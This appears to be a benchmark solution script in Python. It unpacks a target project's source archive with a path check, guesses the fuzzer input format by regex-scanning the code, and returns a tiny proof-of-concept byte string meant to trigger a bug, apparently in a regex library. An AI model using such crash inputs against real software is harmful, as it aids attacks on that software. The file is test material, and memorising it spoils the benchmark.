import os
import re
import tarfile
import tempfile
from typing import List


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="poc_extract_")

        def safe_extract(tar: tarfile.TarFile, path: str = "."):
            for member in tar.getmembers():
                member_path = os.path.join(path, member.name)
                abs_directory = os.path.abspath(path)
                abs_target = os.path.abspath(member_path)
                if not abs_target.startswith(abs_directory):
                    continue
                tar.extract(member, path)
        try:
            with tarfile.open(src_path, "r:*") as tf:
                safe_extract(tf, tmpdir)
        except Exception:
            # If extraction fails, fall back to a general PoC
            return b'a\x00a\x00\x00\x00\x00\x00'

        def collect_files(root: str, exts: List[str]) -> List[str]:
            out = []
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    if any(fn.endswith(ext) for ext in exts):
                        out.append(os.path.join(dirpath, fn))
            return out

        files = collect_files(tmpdir, [".c", ".cc", ".cpp", ".h", ".hpp", ".txt", ".md", ".py"])
        content = ""
        for f in files:
            try:
                with open(f, "r", encoding="utf-8", errors="ignore") as fh:
                    content += fh.read() + "\n"
            except Exception:
                pass

        content_low = content.lower()

        # Detect likely input style
        style = "nul"  # default guess
        if "llvmfuzzertestoneinput" in content_low:
            # Try to identify patterns used in fuzzer harness
            if re.search(r"memchr\s*\(\s*data\s*,\s*0", content, re.IGNORECASE):
                style = "nul"
            elif re.search(r"(uint|u)32_t\s+.*(len|size)", content, re.IGNORECASE) and re.search(r"size\s*<\s*8", content, re.IGNORECASE):
                style = "lenpref"
            elif re.search(r"fgets|getline|std::getline", content, re.IGNORECASE):
                style = "line"
        else:
            # No libFuzzer harness; guess based on common IO patterns
            if re.search(r"fgets|getline|std::getline", content, re.IGNORECASE):
                style = "line"
            elif re.search(r"(uint|u)32_t\s+.*(len|size)", content, re.IGNORECASE) and re.search(r"size\s*<\s*8", content, re.IGNORECASE):
                style = "lenpref"
            elif re.search(r"memchr\s*\(\s*data\s*,\s*0", content, re.IGNORECASE):
                style = "nul"
            else:
                # Look for PCRE hints
                if re.search(r"\bpcre2?_compile\b|\bpcre2?_exec\b|\bovector\b", content, re.IGNORECASE):
                    style = "nul"
                else:
                    style = "nul"

        # Generate PoC based on detected style
        if style == "lenpref":
            # Prefer empty pattern and empty subject; many fuzzers will proceed and attempt a match
            # 8 bytes: [pat_len=0][subj_len=0]
            return b"\x00\x00\x00\x00\x00\x00\x00\x00"

        if style == "line":
            # Two lines: pattern without capturing groups, and matching subject.
            # Pad to exactly 8 bytes.
            base = b"a\na\n"
            if len(base) >= 8:
                return base[:8]
            return base + b"A" * (8 - len(base))

        # Default / nul-separated pattern-subject
        # Pattern 'a', subject 'a', then NUL padding to 8 bytes.
        poc = b"a\x00a\x00"
        if len(poc) >= 8:
            return poc[:8]
        return poc + b"\x00" * (8 - len(poc))
